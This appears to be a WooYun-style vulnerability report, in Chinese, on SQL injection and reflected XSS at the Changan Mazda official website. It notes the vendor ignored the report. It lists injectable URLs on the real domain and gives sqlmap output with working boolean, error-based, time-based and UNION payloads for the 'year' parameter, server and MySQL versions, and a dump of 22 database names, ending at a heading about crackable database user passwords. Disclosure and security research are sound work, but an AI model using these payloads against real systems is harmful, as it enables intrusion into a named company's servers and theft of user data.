wybug_title: 长安马自达汽车有限公司官网多处SQL注入漏洞&反射型xss
wybug_corp: 长安马自达汽车有限公司
wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2015-11-30：	细节已通知厂商并且等待厂商处理中									2015-12-05：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 长安马自达汽车有限公司官网多处SQL注入漏洞&反射型xss，泄露大量用户信息 详细说明：  注入点：
http://www.changan-mazda.com.cn//market/2015axelaanniversary/index/info/11/%5chttp://www.changan-mazda.com.cn:80//excellenceplan/position?keyword=&type=%5chttp://www.changan-mazda.com.cn:80//news/index?page=2&year=12345'"\'\");|]*%00{%0d%0a<%00>%bf%27'馃挬http://www.changan-mazda.com.cn:80//news/index?page=2&year=1
其中三处可通过%5c暴库，泄露绝对路径：

通过sqlmap注入测试：
GET parameter 'year' is vulnerable. Do you want to keep testing the others (if any)? [y/N] sqlmap identified the following injection point(s) with a total of 248 HTTP(s) requests:---Parameter: year (GET)    Type: boolean-based blind    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: page=2&year=1 RLIKE (SELECT (CASE WHEN (3731=3731) THEN 1 ELSE 0x28 END))    Type: error-based    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)    Payload: page=2&year=1 AND EXTRACTVALUE(4008,CONCAT(0x5c,0x7178787671,(SELECT (ELT(4008=4008,1))),0x717a6a6a71))    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 OR time-based blind    Payload: page=2&year=1 OR SLEEP(5)    Type: UNION query    Title: Generic UNION query (NULL) - 27 columns    Payload: page=2&year=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7178787671,0x66684b52744d426a706b,0x717a6a6a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ---[00:36:05] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.3.10, Apache 2.4.1back-end DBMS: MySQL 5.1[00:36:05] [INFO] fetching database namesavailable databases [22]:[*] aaa[*] car[*] car_bak[*] changanmzd[*] changanmzd2015[*] chetie[*] ct[*] cx[*] cx5[*] cx5_2015[*] cx5_818[*] cx5wrzy[*] information_schema[*] market2015[*] market_babaquna[*] mazda[*] mazda_yumatravel[*] mazida[*] mysql[*] performance_schema[*] test[*] yumazu[00:36:06] [WARNING] HTTP error codes detected during run:500 (Internal Server Error) - 210 times, 502 (Bad Gateway) - 2 times[00:36:06] [INFO] fetched data logged to text files under '/root/.sqlmap/output/www.changan-mazda.com.cn'[*] shutting down at 00:36:06mysql数据库用户和密码：大部分可解密：
